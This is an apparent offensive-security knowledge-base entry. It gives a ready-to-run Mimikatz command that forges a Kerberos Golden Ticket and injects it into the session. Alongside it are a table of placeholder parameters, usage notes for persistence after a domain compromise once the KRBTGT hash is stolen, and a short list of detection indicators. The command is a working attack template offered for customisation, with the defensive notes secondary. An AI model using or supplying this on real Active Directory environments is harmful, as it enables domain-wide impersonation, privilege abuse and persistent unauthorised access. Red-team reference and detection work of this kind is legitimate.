---
id: 7c06200a-5301-47a6-91b8-030900897b88
name: Mimikatz-Kerberos-Golden-Ticket-Template
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:27.267548+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - golden-ticket
  - mimikatz
validated: true
---

# Mimikatz-Kerberos-Golden-Ticket-Template

## Code

```powershell
.\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
```

## Description

This PowerShell snippet invokes Mimikatz to generate a basic Kerberos Golden Ticket using placeholder parameters. It forges a TGT for domain impersonation and injects it for immediate use, serving as a template for customization in Active Directory attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| ADMINACCOUNTNAME | Administrative account to impersonate | Administrator |
| DOMAINFQDN | Fully qualified domain name | contoso.com |
| ACCOUNTRID | Relative ID of the target account | 500 |
| DOMAINSID | Domain Security Identifier | S-1-5-21-1234567890-1234567890-1234567890 |
| KRBTGTPASSWORDHASH | NTLM hash of KRBTGT account | a1b2c3d4e5f678901234567890123456 |

## Usage

Execute this in an elevated PowerShell session on a domain-joined Windows machine after obtaining the KRBTGT hash. Customize parameters based on reconnaissance, then run to inject the ticket. Follow with verification using `klist` or resource access tests. Commonly used in persistence phases after initial compromise.

## Detection

- Monitor for Mimikatz process execution or command-line arguments containing 'kerberos::golden' (via Sysmon or EDR).
- Anomalous Kerberos TGTs with extended lifetimes in Event ID 4768 logs.
- LSASS memory access patterns indicative of credential dumping prior to hash extraction.

## Related

- [[procedures/Golden-Ticket-Generation-with-Mimikatz]]
- [[tools/Mimikatz]]
